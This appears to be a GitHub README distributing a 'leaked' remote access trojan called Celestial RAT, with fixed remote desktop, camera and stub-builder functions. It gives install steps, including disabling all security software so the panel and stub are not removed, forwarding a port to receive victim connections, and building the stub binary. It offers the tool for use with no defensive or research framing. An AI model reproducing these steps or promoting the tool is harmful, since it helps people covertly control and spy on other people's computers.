# Celestial Remote Administration Tool

## About
This repo contains both source code and compiled version of leaked Celestial Remote Administration Tool with fixes, related to remote desktop and camera proper functioning and builder.

---
## Screenshots
![home](https://github.com/user-attachments/assets/0c749bbf-0784-4bb9-a02d-3c16e9730a33)
![clients](https://github.com/user-attachments/assets/6d98c60d-6cdd-4356-81b3-e646972b96a5)

## Installation
Here are the steps below to set up the project easily:

1. Download `Release.zip` from [link here](https://github.com/myzin1176/Celestial-RAT/releases/tag/v1.0.0).

2. Extract all the files from archive to any folder you want, previously disabling all security to prevent Panel and Stub from removing.

3. Launch `Celestial.exe` and start listening to any port.

> [!IMPORTANT]
> You need to forward a port in order to handle client connections outside your local network.

---

You can also build the project from sources given in this repo.

1. Build the Panel from `Server/CelestialDES` folder.

2. Build the Stub from `Client/celestialC` folder and rename the output binary to `RT.bin`

3. Move `RT.bin` to `bin/data` folder with the Panel binary.


## Support
Make to sure to star this repo if you found it useful!

## License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/myzin1176/Celestial-RAT/blob/main/LICENSE) file for details
